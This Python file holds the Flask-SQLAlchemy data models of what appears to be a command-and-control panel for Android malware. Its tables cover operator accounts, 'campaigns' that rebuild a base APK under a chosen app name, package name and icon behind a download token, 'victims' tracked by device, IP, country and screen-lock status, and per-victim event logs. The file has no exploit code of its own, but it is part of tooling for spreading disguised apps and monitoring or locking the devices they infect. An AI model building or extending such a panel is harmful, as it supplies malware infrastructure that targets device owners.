from flask_sqlalchemy import SQLAlchemy
from flask_login import UserMixin
from datetime import datetime
import uuid

db = SQLAlchemy()

class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(256), nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    campaigns = db.relationship('Campaign', backref='owner', lazy=True)

class Campaign(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    app_name = db.Column(db.String(100), nullable=False)
    package_name = db.Column(db.String(100), nullable=False)
    icon_path = db.Column(db.String(255))
    base_apk_path = db.Column(db.String(255), nullable=False)
    built_apk_path = db.Column(db.String(255))
    download_token = db.Column(db.String(64), unique=True, default=lambda: str(uuid.uuid4()).replace('-', ''))
    download_count = db.Column(db.Integer, default=0)
    active = db.Column(db.Boolean, default=True)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    victims = db.relationship('Victim', backref='campaign', lazy=True)

class Victim(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.String(128), nullable=False)
    device_model = db.Column(db.String(100))
    android_version = db.Column(db.String(50))
    ip_address = db.Column(db.String(45))
    country = db.Column(db.String(100))
    first_seen = db.Column(db.DateTime, default=datetime.utcnow)
    last_seen = db.Column(db.DateTime, default=datetime.utcnow)
    screen_locked = db.Column(db.Boolean, default=False)
    lock_type = db.Column(db.String(20))
    campaign_id = db.Column(db.Integer, db.ForeignKey('campaign.id'), nullable=False)
    logs = db.relationship('Log', backref='victim', lazy=True)

class Log(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    event_type = db.Column(db.String(50), nullable=False)
    data = db.Column(db.Text)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    victim_id = db.Column(db.Integer, db.ForeignKey('victim.id'), nullable=False)